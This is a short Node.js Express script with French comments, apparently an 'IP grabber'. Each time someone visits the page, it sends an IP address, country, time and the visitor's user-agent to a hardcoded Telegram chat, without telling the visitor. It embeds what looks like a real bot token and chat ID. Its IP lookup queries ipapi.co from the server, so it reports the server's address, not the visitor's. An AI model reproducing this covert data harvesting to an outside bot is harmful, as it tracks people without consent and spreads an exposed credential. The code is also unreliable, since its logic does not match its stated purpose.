const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const app = express();
const port = 3000;

// Remplacez par le token de votre bot Telegram
const botToken = '6615386452:AAEdW1VIcNSRgkfFyna0R1kTnLoO-JqnyZY';

const bot = new TelegramBot(botToken, { polling: true });

app.get('/', async (req, res) => {
  const chatId = '5838829453'; // Remplacez par l'ID de chat où vous souhaitez recevoir les données

  // Obtenir l'adresse IP et le pays
  try {
    const ipResponse = await axios.get('https://ipapi.co/json/');
    const ipData = ipResponse.data;
    const ipAddress = ipData.ip;
    const country = ipData.country_name;

    // Obtenir l'heure locale
    const currentTime = new Date();

    // Obtenir le modèle de l'appareil
    const userAgent = req.headers['user-agent'];

    // Envoyer les informations au bot Telegram
    const message = `
Adresse IP : ${ipAddress}
Pays : ${country}
Heure locale : ${currentTime}
Modèle de l'appareil : ${userAgent}
`;

    bot.sendMessage(chatId, message);
    res.send('Informations envoyées au bot Telegram.');
  } catch (error) {
    console.error('Erreur lors de la récupération des informations :', error);
    res.status(500).send('Erreur lors de la récupération des informations.');
  }
});

app.listen(port, () => {
  console.log(`Serveur en cours d'exécution sur le port ${port}`);
});
